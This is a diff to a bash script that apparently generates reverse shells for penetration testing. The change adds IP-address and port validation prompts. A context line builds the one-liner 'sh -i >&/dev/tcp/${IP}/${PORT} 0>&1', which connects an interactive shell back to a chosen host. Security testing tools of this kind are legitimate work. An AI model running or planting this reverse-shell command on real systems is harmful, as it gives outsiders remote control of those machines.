@@ -31,7 +31,34 @@ Revshells(){
 # sh/bash
 SH(){
   IP=$(gum input --value "$IP" --placeholder "Host IP")
+
+  if [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; then
+    while [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; do
+      GUM_CONFIRM=false
+      gum confirm "The IP address is incorrect. Do you want to enter it again" && \
+      IP=$(gum input --value "$IP" --placeholder "Host IP") && \
+      GUM_CONFIRM=true
+
+      if [ "$GUM_CONFIRM" = false ] ; then
+        exit 1
+      fi
+    done
+  fi
+  
   PORT=$(gum input --value "$PORT" --placeholder "Port")
+
+  if [ ! -z "$PORT" ] || [ ! "$PORT" -lt 0 ] || [ ! "$PORT" -ge 65536 ]; then
+    while [ -z "$PORT" ] || [ "$PORT" -lt 0 ] || [ "$PORT" -ge 65536 ]; do
+      GUM_CONFIRM=false
+      gum confirm "The Port number is incorrect. Do you want to enter it again?" && \
+      PORT=$(gum input --value "$PORT" --placeholder "Port") && \
+      GUM_CONFIRM=true
+      
+      if [ "$GUM_CONFIRM" = false ] ; then
+        exit 1
+      fi
+    done
+  fi
 
   RSHELL="sh -i >&/dev/tcp/${IP}/${PORT} 0>&1"
 
